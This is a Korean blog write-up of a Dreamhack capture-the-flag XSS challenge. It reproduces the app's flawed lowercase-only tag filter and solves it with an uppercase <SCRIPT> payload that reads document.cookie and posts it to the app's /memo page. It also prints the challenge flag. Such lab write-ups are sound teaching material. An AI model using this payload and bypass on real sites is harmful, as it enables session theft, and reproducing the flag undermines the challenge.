---
title: "[Dreamhack] XSS Filtering Bypass 해설"
author: jyp
date: 2026-06-09 12:00:01 +0900
categories: [Dreamhack]
tags: [dreamhack , WebHacking]
math: true
---

# 문제 특징

> XSS를 사용한 해킹 & 금지 태그 우회

## **난이도**: Lv.1
## **카테고리**: 웹해킹

---

# 문제 구조

## 문제파일구성

```
/
├── deploy
│   ├── app.py
│   ├── flag.txt
│   ├── requirements.txt
│   ├── static
│   └── templates
└── Dockerfile
```

## 주요 코드 

```python

#app.py

def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True


def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)

def xss_filter(text):
    _filter = ["script", "on", "javascript:"]
    for f in _filter:
        if f in text.lower():
            text = text.replace(f, "")
    return text

@app.route("/")
def index():
    return render_template("index.html")


@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    param = xss_filter(param)
    return param


@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'


memo_text = ""


@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text)


```

이 문제는 문제의 제목 그대로 ![XSS-2](https://1221jyp.com/posts/Dreamhack_Xss-2/)문제와 매우 유사한 문제이지만, 특정 명령어를 `/vuln`주소로 이동할 수 없게 막아놓은 코드가 존재한다. 

`XSS`가 무엇인지 궁금하다면 ![XSS-2](https://1221jyp.com/posts/Dreamhack_Xss-2/)문제를 먼저 확인하자.

# 풀이

## 필터에 작성되어있는 특정 문자들을 사용하지 않고 페이로드 작성하기
```python
def xss_filter(text):
    _filter = ["script", "on", "javascript:"]
    for f in _filter:
        if f in text.lower():
            text = text.replace(f, "")
    return text
```
필터로 작동되는 함수를 확인하면, 대문자로 페이로드를 작성했을때, `text.lower()`로 인해서 감지는 가능하지만, 
해당 텍스트를 삭제할 때에는 소문자로 된 텍스트만 삭제하기 때문에, 대문자로 작성된 스크립트는 우회가 가능하다.



**EX)**

**script1 => 1**

**SCRIPT1 => SCRIPT1**


```python
def vuln():
    param = request.args.get("param", "")
    param = xss_filter(param)
    return param
```

또한 `/vuln`주소에서 param을 그대로 `return`하기 때문에 `<SCRIPT>`태그가 사용 가능하다.

## 페이로드

```html
<SCRIPT>fetch('/memo?memo='+document.cookie)</SCRIPT>

```

해당 페이로드를 `/flag`의 `<input>` 박스에 넣고 전송하면 `/memo`에서 플래그를 확인할 수 있다.


# 정답

DH{81cd7cb24a49ad75b9ba37c2b0cda4ea}

